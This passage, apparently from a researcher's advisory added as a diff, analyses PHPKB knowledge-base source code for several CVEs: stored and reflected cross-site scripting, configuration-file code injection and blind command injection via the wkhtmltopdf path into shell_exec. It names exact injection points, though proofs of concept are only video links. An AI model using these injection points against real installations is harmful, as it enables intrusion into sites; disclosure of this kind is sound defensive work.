+				<span class="nx">_params</span>		<span class="o">=</span> <span class="dl">"</span><span class="s2">called=ajax&amp;act=</span><span class="dl">"</span><span class="o">+</span><span class="nx">_action</span><span class="o">+</span><span class="dl">'</span><span class="s1">&amp;output=</span><span class="dl">'</span><span class="o">+</span><span class="nx">_divid</span><span class="o">+</span><span class="dl">'</span><span class="s1">&amp;linkid=</span><span class="dl">'</span><span class="o">+</span><span class="nx">_array</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">+</span><span class="dl">'</span><span class="s1">&amp;type=</span><span class="dl">'</span><span class="o">+</span><span class="nx">_array</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">+</span><span class="dl">'</span><span class="s1">&amp;cnt=</span><span class="dl">'</span><span class="o">+</span><span class="nx">_array</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="o">+</span><span class="dl">'</span><span class="s1">&amp;range=</span><span class="dl">'</span><span class="o">+</span><span class="nx">_range</span><span class="o">+</span><span class="dl">'</span><span class="s1">&amp;sf=</span><span class="dl">'</span><span class="o">+</span><span class="nx">_array</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span><span class="o">+</span><span class="dl">'</span><span class="s1">&amp;id=</span><span class="dl">'</span><span class="o">+</span><span class="nx">_array</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span><span class="o">+</span><span class="dl">'</span><span class="s1">&amp;page=</span><span class="dl">'</span><span class="o">+</span><span class="nx">_array</span><span class="p">[</span><span class="mi">9</span><span class="p">];</span> <span class="c1">//The URL of the request that is going to be passed to ajaxObj is defined</span>
+			<span class="p">}</span>
+			<span class="k">else</span><span class="p">{</span>
+				<span class="nx">jQuery</span><span class="p">(</span><span class="dl">'</span><span class="s1">#</span><span class="dl">'</span><span class="o">+</span><span class="nx">_array</span><span class="p">[</span><span class="mi">2</span><span class="p">]).</span><span class="nx">html</span><span class="p">(</span><span class="nx">_array</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="o">+</span><span class="dl">'</span><span class="s1"> &lt;i class="fa fa-chevron-circle-down text-primary"&gt;&lt;/i&gt;</span><span class="dl">'</span><span class="p">);</span>
+			<span class="p">}</span>
+			<span class="k">break</span><span class="p">;</span>
+<span class="c1">// Skipped some code</span>
+		<span class="k">new</span> <span class="nx">ajaxObj</span><span class="p">(</span><span class="dl">'</span><span class="s1">include/operations.php</span><span class="dl">'</span><span class="p">,</span> <span class="nx">_divid</span><span class="p">,</span> <span class="dl">''</span><span class="p">,</span> <span class="nx">_params</span><span class="p">);</span> <span class="c1">//The request is sent to include/operations.php</span></code></pre></figure>
+
+<p>File: include/operations.php</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="c1">// Skipping some code</span>
+			<span class="k">case</span> <span class="s1">'referrer-detail'</span><span class="o">:</span>
+		<span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'admin_level_Session_ML'</span><span class="p">]</span><span class="o">==</span><span class="s1">'Superuser'</span><span class="p">)</span> <span class="c1">//If we are logged in as Superuser</span>
+				<span class="p">{</span> <span class="c1">//All the parameters are extracted from the POST request made with axajObj</span>
+					<span class="nv">$linkid</span>		<span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'linkid'</span><span class="p">]);</span>
+					<span class="nv">$type</span>		<span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'type'</span><span class="p">]);</span>
+					<span class="nv">$main_cnt</span>	<span class="o">=</span> <span class="p">(</span><span class="n">int</span><span class="p">)(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'cnt'</span><span class="p">])</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">?</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'cnt'</span><span class="p">])</span> <span class="o">:</span> <span class="mi">0</span><span class="p">);</span>
+					<span class="nv">$date_range</span>	<span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'range'</span><span class="p">]);</span>
+					<span class="nv">$start_from</span>	<span class="o">=</span> <span class="p">(</span><span class="n">int</span><span class="p">)(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'sf'</span><span class="p">])</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">?</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'sf'</span><span class="p">])</span> <span class="o">:</span> <span class="mi">0</span><span class="p">);</span>
+					<span class="nv">$id</span>		<span class="o">=</span> <span class="p">(</span><span class="n">int</span><span class="p">)(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">?</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span> <span class="o">:</span> <span class="mi">0</span><span class="p">);</span>
+					<span class="nv">$page</span>		<span class="o">=</span> <span class="p">(</span><span class="n">int</span><span class="p">)</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'page'</span><span class="p">]);</span>
+<span class="c1">// Skipping some code</span>
+					<span class="nv">$array</span>		<span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'to'</span><span class="p">,</span> <span class="nv">$date_range</span><span class="p">);</span> <span class="c1">//Split the string at the 'to' delimiter</span>
+					<span class="nv">$from</span>		<span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$array</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="c1">//First part of the array is the starting date</span>
+					<span class="nv">$to</span>			<span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$array</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span> <span class="c1">//Last part of the array is the ending date</span>
+<span class="c1">// Skipping some code</span>
+						<span class="nv">$type</span> <span class="o">=</span> <span class="nf">sanitizeInput</span><span class="p">(</span><span class="nv">$type</span><span class="p">);</span> <span class="c1">//The type variable is sanitized (for sql-injection)</span>
+						<span class="nv">$WHERE_part</span>	<span class="o">=</span> <span class="s2">" WHERE (DATE(referrer_date_time) BETWEEN '"</span><span class="mf">.</span><span class="nf">sanitizeInput</span><span class="p">(</span><span class="nv">$from</span><span class="p">)</span><span class="mf">.</span><span class="s2">"' AND '"</span><span class="mf">.</span><span class="nf">sanitizeInput</span><span class="p">(</span><span class="nv">$to</span><span class="p">)</span><span class="mf">.</span><span class="s2">"') AND referrer IN(</span><span class="si">{</span><span class="nv">$type_query</span><span class="si">}</span><span class="s2">) "</span><span class="mf">.</span><span class="p">(</span><span class="nv">$id</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">?</span> <span class="s2">" AND article_id=</span><span class="si">{</span><span class="nv">$id</span><span class="si">}</span><span class="s2">"</span> <span class="o">:</span> <span class="s1">''</span><span class="p">)</span><span class="mf">.</span><span class="s2">" AND phpkb_articles.article_id=phpkb_referrers.article_id </span><span class="si">{</span><span class="nv">$AND_Language_Query</span><span class="si">}</span><span class="s2">"</span><span class="p">;</span> <span class="c1">//The where part in the final sql statement is made</span>
+						<span class="nv">$query</span>	<span class="o">=</span> <span class="s2">"	SELECT referrer_id, referrer_url, referrer_date_time, phpkb_articles.article_id 
+									FROM phpkb_referrers, phpkb_articles 
+									</span><span class="si">{</span><span class="nv">$WHERE_part</span><span class="si">}</span><span class="s2"> 
+									ORDER BY referrer_date_time DESC 
+									LIMIT </span><span class="si">{</span><span class="nv">$start_from</span><span class="si">}</span><span class="s2">,</span><span class="si">{</span><span class="nv">$results_perpage</span><span class="si">}</span><span class="s2">"</span><span class="p">;</span>
+						<span class="nv">$result</span>	<span class="o">=</span> <span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">'connection'</span><span class="p">],</span> <span class="nv">$query</span><span class="p">);</span> <span class="c1">//The query that retrieves the Referer header URLs is made and executed</span>
+<span class="c1">// Skipping some code</span>
+							<span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nf">mysqli_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="c1">//For each row returned by the last query</span>
+							<span class="p">{</span>
+								<span class="nv">$origin</span>	<span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'referrer_url'</span><span class="p">]);</span>
+								<span class="nv">$url</span>	<span class="o">=</span> <span class="nb">parse_url</span><span class="p">(</span><span class="nb">urldecode</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'referrer_url'</span><span class="p">]));</span>
+								<span class="nv">$domain</span>	<span class="o">=</span> <span class="nv">$url</span><span class="p">[</span><span class="s1">'host'</span><span class="p">];</span> <span class="c1">//Here lies the vulnerability, the host is extracted from the Referer header without being sanitized</span>
+								<span class="nv">$path</span>	<span class="o">=</span> <span class="nv">$url</span><span class="p">[</span><span class="s1">'path'</span><span class="p">];</span>
+								<span class="nv">$date</span>	<span class="o">=</span> <span class="nf">convertDateTime</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'referrer_date_time'</span><span class="p">],</span><span class="mi">1</span><span class="p">,</span><span class="s1">'b'</span><span class="p">,</span><span class="s1">'at'</span><span class="p">);</span>
+								<span class="nv">$title</span>	<span class="o">=</span> <span class="nf">mysqli_result</span><span class="p">(</span><span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">'connection'</span><span class="p">],</span> <span class="s1">'SELECT article_title FROM phpkb_articles WHERE article_id='</span><span class="mf">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'article_id'</span><span class="p">]),</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+								<span class="nv">$title</span>	<span class="o">=</span> <span class="nv">$title</span><span class="o">==</span><span class="s1">''</span> <span class="o">?</span> <span class="nv">$unknown_tpl</span> <span class="o">:</span> <span class="s2">"&lt;a href=</span><span class="se">\"</span><span class="si">{</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">'path_kb'</span><span class="p">]</span><span class="si">}</span><span class="s2">/article.php?id=</span><span class="si">{</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'article_id'</span><span class="p">]</span><span class="si">}</span><span class="se">\"</span><span class="s2"> target=</span><span class="se">\"</span><span class="s2">_blank</span><span class="se">\"</span><span class="s2"> class=</span><span class="se">\"</span><span class="s2">text-success</span><span class="se">\"</span><span class="s2">&gt;</span><span class="si">{</span><span class="nv">$title</span><span class="si">}</span><span class="s2">&lt;/span&gt;&lt;/a&gt; "</span><span class="p">;</span>
+								<span class="nv">$host</span>   <span class="o">=</span> <span class="nv">$domain</span><span class="p">;</span> <span class="c1">//The value of domain variable is passed to the host variable</span>
+<span class="c1">// Skipping some code</span>
+								<span class="nv">$tableRows</span> <span class="mf">.</span><span class="o">=</span> <span class="s2">"&lt;tr&gt;
+													&lt;td width=</span><span class="se">\"</span><span class="s2">7%</span><span class="se">\"</span><span class="s2">&gt;</span><span class="nv">$sno</span><span class="s2">&lt;/td&gt;
+													&lt;td width=</span><span class="se">\"</span><span class="s2">23%</span><span class="se">\"</span><span class="s2">&gt;</span><span class="si">{</span><span class="nv">$host</span><span class="si">}</span><span class="s2">&lt;/td&gt;
+													&lt;td width=</span><span class="se">\"</span><span class="s2">25%</span><span class="se">\"</span><span class="s2">&gt;</span><span class="si">{</span><span class="nv">$keywords</span><span class="si">}</span><span class="s2">&lt;/td&gt;
+													&lt;td&gt;</span><span class="si">{</span><span class="nv">$title</span><span class="si">}</span><span class="s2">&lt;/td&gt;
+													&lt;td width=</span><span class="se">\"</span><span class="s2">18%</span><span class="se">\"</span><span class="s2">&gt;</span><span class="si">{</span><span class="nv">$date</span><span class="si">}</span><span class="s2">&lt;/td&gt;
+												&lt;/tr&gt;"</span><span class="p">;</span> <span class="c1">//The Referer header is printed without being sanitized, the Cross-Site Scripting is triggered</span></code></pre></figure>
+
+<p>Proof of concept:</p>
+
+<p><a href="https://vimeo.com/490370592">Video</a></p>
+
+<h2 id="authenticated-remote-code-execution-cve-2020-10389">Authenticated Remote Code Execution (CVE-2020-10389)</h2>
+<p>Exploitable by: Superuser</p>
+
+<p>Vulnerable file: admin/save-settings.php allows overwriting, exploit code stored at admin/include/configuration.php, triggered at index.php (or any file that includes admin/include/configuration.php)</p>
+
+<p>File: admin/save-settings.php</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$session_admin_level</span><span class="o">==</span><span class="s1">'Superuser'</span><span class="p">)</span> <span class="c1">//Check if we are logged in as Superuser</span>
+<span class="p">{</span>
+	<span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'submit'</span><span class="p">]</span><span class="o">==</span><span class="s1">''</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'submit_hd'</span><span class="p">]</span><span class="o">==</span><span class="s1">''</span><span class="p">){</span> <span class="c1">//If the POST parameters submit and submit_hd are empty, redirect to index.php</span>
+		<span class="nb">header</span><span class="p">(</span><span class="s1">'location:index.php'</span><span class="p">);</span>
+		<span class="k">exit</span><span class="p">();</span>
+	<span class="p">}</span>
+<span class="c1">// Skipping some code</span>
+<span class="c1">//There are like 50+ injection points for Remote Code Execution, I'll take for example the first one</span>
+		<span class="nv">$putdown_for_maintenance</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'putdown_for_maintenance'</span><span class="p">]</span><span class="o">!=</span><span class="s1">''</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'putdown_for_maintenance'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">'no'</span><span class="p">;</span> <span class="c1">//The variable $putdown_for_maintenance contains the value that is passed to the POST parameter putdown_for_maintenance, that is to say, user controlled input</span>
+<span class="c1">// Skipping some code</span>
+<span class="c1">//PHP_EOL = End of line, this caught my eye as I was 100% sure that something was going to be written into a file</span>
+		<span class="nv">$configure</span> <span class="o">=</span> <span class="s2">"&lt;?php"</span><span class="mf">.</span><span class="kc">PHP_EOL</span><span class="p">;</span>
+		<span class="nv">$configure</span> <span class="mf">.</span><span class="o">=</span> <span class="s2">"// WARNING: Do not make any changes directly in this file as it may make the 'PHPKB Knowledge Base Software' to stop working properly."</span><span class="mf">.</span><span class="kc">PHP_EOL</span><span class="mf">.</span><span class="kc">PHP_EOL</span><span class="p">;</span>
+ 
+		<span class="nv">$configure</span> <span class="mf">.</span><span class="o">=</span> <span class="s2">"// PHPKB Professional Status Settings "</span><span class="mf">.</span><span class="kc">PHP_EOL</span><span class="p">;</span>
+		<span class="nv">$configure</span> <span class="mf">.</span><span class="o">=</span> <span class="s2">"</span><span class="se">\$</span><span class="s2">putdown_for_maintenance  = '</span><span class="si">{</span><span class="nv">$putdown_for_maintenance</span><span class="si">}</span><span class="s2">';"</span><span class="mf">.</span><span class="kc">PHP_EOL</span><span class="mf">.</span><span class="kc">PHP_EOL</span><span class="p">;</span> <span class="c1">//Our variable is written into a file</span>
+ 
+		<span class="nv">$configure</span> <span class="mf">.</span><span class="o">=</span> <span class="s2">"// General Settings "</span><span class="mf">.</span><span class="kc">PHP_EOL</span><span class="p">;</span>
+		<span class="nv">$configure</span> <span class="mf">.</span><span class="o">=</span> <span class="s2">"</span><span class="se">\$</span><span class="s2">kbName		= </span><span class="se">\"</span><span class="s2">"</span><span class="mf">.</span><span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$kbName</span><span class="p">)</span><span class="mf">.</span><span class="s2">"</span><span class="se">\"</span><span class="s2">;"</span><span class="mf">.</span><span class="kc">PHP_EOL</span><span class="p">;</span>
+<span class="c1">// Skipping some code</span>
+				<span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s1">'include/configuration.php'</span><span class="p">,</span> <span class="s1">'wb'</span><span class="p">);</span> <span class="c1">//We are going to open a PHP file with write-bytes mode</span>
+				<span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="c1">// The file was opened OK, let's write to it</span>
+				<span class="p">{</span>
+					<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$configure</span><span class="p">);</span> <span class="c1">//User controlled input is written directly into a PHP file, time for Remote code execution</span>
+					<span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span></code></pre></figure>
+
+<p>We can trigger Remote Code Execution thanks to PHP’s built-in system(); function. The following proof of concept will show the output of the command “dir”:</p>
+
+<p><a href="https://vimeo.com/490370706">Video</a></p>
+
+<h2 id="out-of-band-blind-authenticated-remote-code-execution-cve-2020-10390">Out of Band (blind) Authenticated Remote Code Execution (CVE-2020-10390)</h2>
+<p>Exploitable by: Superuser</p>
+
+<p>Vulnerable file: include/functions-article.php, triggered after saving the new pdf generator path at admin/save-settings.php (different vector than the authenticated remote code execution I just described)</p>
+
+<p>File: admin/save-settings.php</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$session_admin_level</span><span class="o">==</span><span class="s1">'Superuser'</span><span class="p">)</span> <span class="c1">//Check if we are logged in as Superuser</span>
+<span class="p">{</span>
+	<span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'submit'</span><span class="p">]</span><span class="o">==</span><span class="s1">''</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'submit_hd'</span><span class="p">]</span><span class="o">==</span><span class="s1">''</span><span class="p">){</span> <span class="c1">//If the POST parameters submit and submit_hd are empty, redirect to index.php</span>
+		<span class="nb">header</span><span class="p">(</span><span class="s1">'location:index.php'</span><span class="p">);</span>
+		<span class="k">exit</span><span class="p">();</span>
+	<span class="p">}</span>
+<span class="c1">// Skipping some code</span>
+			<span class="nv">$wkhtmltopdf_path</span>	<span class="o">=</span> <span class="nb">function_exists</span><span class="p">(</span><span class="s1">'get_magic_quotes_gpc'</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">get_magic_quotes_gpc</span><span class="p">()</span><span class="o">===</span><span class="mi">1</span> <span class="o">?</span> <span class="nb">trim</span><span class="p">(</span><span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'wkhtmltopdf_path'</span><span class="p">]))</span> <span class="o">:</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'wkhtmltopdf_path'</span><span class="p">]);</span> <span class="c1">//The variable $wkhtmltopdf_path contains the value that is passed to the POST parameter wkhtmltopdf_path, that is to say, user controlled input</span>
+<span class="c1">// Skipping some code</span>
+<span class="c1">//PHP_EOL = End of line, same as the last remote code execution, the configuration is written to a file</span>
+		<span class="nv">$configure</span> <span class="o">=</span> <span class="s2">"&lt;?php"</span><span class="mf">.</span><span class="kc">PHP_EOL</span><span class="p">;</span>
+<span class="c1">// Skipping some code</span>
+		<span class="nv">$configure</span> <span class="mf">.</span><span class="o">=</span> <span class="s2">"</span><span class="se">\$</span><span class="s2">wkhtmltopdf_path			= </span><span class="se">\"</span><span class="nv">$wkhtmltopdf_path</span><span class="se">\"</span><span class="s2">;"</span><span class="mf">.</span><span class="kc">PHP_EOL</span><span class="p">;</span> <span class="c1">//The wkhtmltopdf_path is prepared to be written in admin/include/configuration.php</span>
+<span class="c1">// Skipping some code</span>
+				<span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s1">'include/configuration.php'</span><span class="p">,</span> <span class="s1">'wb'</span><span class="p">);</span> <span class="c1">//We are going to open a PHP file with write-bytes mode</span>
+				<span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="c1">// The file was opened OK, let's write to it</span>
+				<span class="p">{</span>
+					<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$configure</span><span class="p">);</span> <span class="c1">//Overwriting the wkhtmltopdf_path</span>
+					<span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span></code></pre></figure>
+
+<p>The new wkhtmltopdf_path is placed inside the configuration file, from now on, it can be referenced in other parts of the web application. The official website of wkhtmltopdf says:
+wkhtmltopdf and wkhtmltoimage are open source (LGPLv3) command line tools to render HTML into PDF and various image formats using the Qt WebKit rendering engine. These run entirely “headless” and do not require a display or display service.
+PHPKB has a feature that allows anyone to generate a pdf copy of an article, managed by export.php:</p>
+
+<p>File: export.php</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="c1">// Skipping some includes</span>
+<span class="k">include</span><span class="p">(</span><span class="s1">'include/functions.php'</span><span class="p">);</span>
+<span class="c1">// Skipping some includes</span>
+<span class="nv">$artid</span> <span class="o">=</span> <span class="p">(</span><span class="n">int</span><span class="p">)</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]);</span> <span class="c1">//The id of the article we want to export as pdf</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$artid</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'type'</span><span class="p">]</span><span class="o">==</span><span class="s2">"PDF"</span><span class="p">){</span> <span class="c1">//If the GET parameter is set to PDF, then call the function Articles_Detail();</span>
+		<span class="nf">Articles_Detail</span><span class="p">(</span><span class="s1">'PDF'</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="k">else</span><span class="p">{</span>
+		<span class="nf">Articles_Detail</span><span class="p">(</span><span class="s1">'MSWORD'</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+<span class="k">else</span><span class="p">{</span>
+	<span class="k">echo</span> <span class="s2">"&lt;h1&gt;Access Denied&lt;/h1&gt;"</span><span class="p">;</span>	
+<span class="p">}</span>
+<span class="cp">?&gt;</span></code></pre></figure>
+
+<p>Digging into include/functions.php, we find a reference to another include:</p>
+
+<p>File: include/functions.php</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+	<span class="k">case</span> <span class="s1">'email.php'</span><span class="o">:</span>
+	<span class="k">case</span> <span class="s1">'export.php'</span><span class="o">:</span>
+	<span class="k">case</span> <span class="s1">'ajax.php'</span><span class="o">:</span>
+	<span class="k">case</span> <span class="s1">'subscribe.php'</span><span class="o">:</span>
+		<span class="k">include</span><span class="p">(</span> <span class="k">__DIR__</span> <span class="mf">.</span> <span class="s1">'/functions-article.php'</span><span class="p">);</span>
+		<span class="k">break</span><span class="p">;</span></code></pre></figure>
+
+<p>Let’s take a look at the new include:</p>
+
+<p>File: functions-article.php</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="c1">// Skipping some code and includes</span>
+						<span class="nv">$WKHTMLTOPDF</span> <span class="o">=</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">'wkhtmltopdf_path'</span><span class="p">];</span> <span class="c1">//The wkhtmltopdf_path value, read from the configuation file, is assigned to the variable $WKHTMLTOPDF</span>
+<span class="c1">// Skipping some code</span>
+						<span class="nv">$output</span>		<span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s2">"</span><span class="nv">$WKHTMLTOPDF</span><span class="s2"> </span><span class="si">{</span><span class="nv">$footerCmd</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="nv">$headerCmd</span><span class="si">}</span><span class="s2"> </span><span class="nv">$html_path</span><span class="s2"> </span><span class="nv">$pdf_path</span><span class="s2">"</span><span class="p">);</span> <span class="c1">//A user controlled input is passed directly into shell_exec, a function that allows code execution</span></code></pre></figure>
+
+<p>This remote code execution is blind: the attacker can execute code but is unable to see the results of the executed code. In order to confirm the vulnerability, we are going to craft a proof of concept that will execute a ping request to our server:</p>
+
+<p><a href="https://vimeo.com/490370785">Video</a></p>
+
+<h2 id="reflected-cross-site-scripting-in-every-admin-page-cve-block-going-from-cve-2020-10391-to-cve-2020-10456">Reflected Cross-Site Scripting in every admin page (CVE BLOCK GOING FROM CVE-2020-10391 TO CVE-2020-10456)</h2>
+<p>Exploitable by: Superuser/Editor/Writer</p>
+
+<p>Vulnerable file: admin/header.php</p>
+
+<p>The Cross-Site Scripting is triggered in these webpages:</p>
+<ul>
+  <li>admin/add-article.php</li>
+  <li>admin/add-category.php</li>
+  <li>admin/add-field.php</li>
+  <li>admin/add-glossary.php</li>
+  <li>admin/add-group.php</li>
+  <li>admin/add-language.php</li>
+  <li>admin/add-news.php</li>
+  <li>admin/add-template.php</li>
+  <li>admin/add-user.php</li>
+  <li>admin/article-collaboration.php</li>
+  <li>admin/edit-article.php</li>
+  <li>admin/edit-category.php</li>
+  <li>admin/edit-comment.php</li>
+  <li>admin/edit-field.php</li>
+  <li>admin/edit-glossary.php</li>
+  <li>admin/edit-group.php</li>
+  <li>admin/edit-news.php</li>
+  <li>admin/edit-subscriber.php</li>
+  <li>admin/edit-template.php</li>
+  <li>admin/edit-user.php</li>
+  <li>admin/email-harvester.php</li>
+  <li>admin/import-csv.php</li>
+  <li>admin/import-html.php</li>
+  <li>admin/index-attachments.php</li>
+  <li>admin/index.php</li>
+  <li>admin/kb-backup.php</li>
+  <li>admin/manage-articles.php</li>
+  <li>admin/manage-attachments.php</li>
+  <li>admin/manage-categories.php</li>
+  <li>admin/manage-comments.php</li>
+  <li>admin/manage-departments.php</li>
+  <li>admin/manage-drafts.php</li>
+  <li>admin/manage-feedbacks.php</li>
+  <li>admin/manage-fields.php</li>
+  <li>admin/manage-glossary.php</li>
+  <li>admin/manage-groups.php</li>
+  <li>admin/manage-languages.php</li>
+  <li>admin/manage-news.php</li>
+  <li>admin/manage-settings.php</li>
+  <li>admin/manage-subscribers.php</li>
+  <li>admin/manage-templates.php</li>
+  <li>admin/manage-tickets.php</li>
+  <li>admin/manage-users.php</li>
+  <li>admin/manage-versions.php</li>
+  <li>admin/my-languages.php</li>
+  <li>admin/my-profile.php</li>
+  <li>admin/optimize-database.php</li>
+  <li>admin/reply-ticket.php</li>
+  <li>admin/report-article-discussed.php</li>
+  <li>admin/report-article-mailed.php</li>
+  <li>admin/report-article-monthly.php</li>
+  <li>admin/report-article-popular.php</li>
+  <li>admin/report-article-printed.php</li>
+  <li>admin/report-article-rated.php</li>
+  <li>admin/report-article.php</li>
+  <li>admin/report-category.php</li>
+  <li>admin/report-failed-login.php</li>
+  <li>admin/report-referrers.php</li>
+  <li>admin/report-search.php</li>
+  <li>admin/report-traffic.php</li>
+  <li>admin/report-user.php</li>
+  <li>admin/save-article.php</li>
+  <li>admin/search-users.php</li>
+  <li>admin/sitemap-generator.php</li>
+  <li>admin/translate.php</li>
+  <li>admin/trash-box.php</li>
+</ul>
+
+<p>For example, let’s analyze admin/add-article.php, one of the list items written above:</p>
+
+<p>File: admin/add-article.php</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="nv">$authority_level</span><span class="o">=</span> <span class="s1">'SEW'</span><span class="p">;</span> <span class="c1">//Checks if we are logged in as a Superuser/Editor/Writer</span>
+<span class="c1">// Skipping some code and includes</span>
+<span class="k">include</span><span class="p">(</span> <span class="k">__DIR__</span> <span class="mf">.</span> <span class="s1">'/include/check-authority.php'</span><span class="p">);</span> <span class="c1">//The vulnerable variable is defined here</span>
+<span class="c1">// Skipping some code and includes</span>
+			<span class="o">&lt;!--</span> <span class="nc">Header</span> <span class="o">-</span> <span class="no">STARTS</span> <span class="o">--&gt;</span>
+			<span class="o">&lt;?</span><span class="n">php</span> <span class="k">include_once</span><span class="p">(</span><span class="s1">'header.php'</span><span class="p">);</span> <span class="cp">?&gt;</span> //The vulnerable variable is echoed here
+			<span class="c">&lt;!-- Header - ENDS --&gt;</span></code></pre></figure>
+
+<p>File: admin/include/check-authority.php</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="c1">// Skipping some code</span>
+<span class="nv">$REQUEST_URI</span><span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_URI'</span><span class="p">];</span> <span class="c1">//Fetch the URI of the current page</span>
+<span class="nv">$_tmp_array</span>	<span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span><span class="nv">$REQUEST_URI</span><span class="p">);</span> <span class="c1">//Split the URI for each /</span>
+<span class="c1">// Skipping some code</span>
+<span class="nv">$lang_header</span> <span class="o">=</span> <span class="nv">$_tmp_array</span><span class="p">[</span><span class="nb">count</span><span class="p">(</span><span class="nv">$_tmp_array</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">];</span> <span class="c1">//Fetch the current executing script (without parent folders) and the parameters passed to the URI (notice that no sanitization happens)</span></code></pre></figure>
+
+<p>File: admin/header.php</p>
+
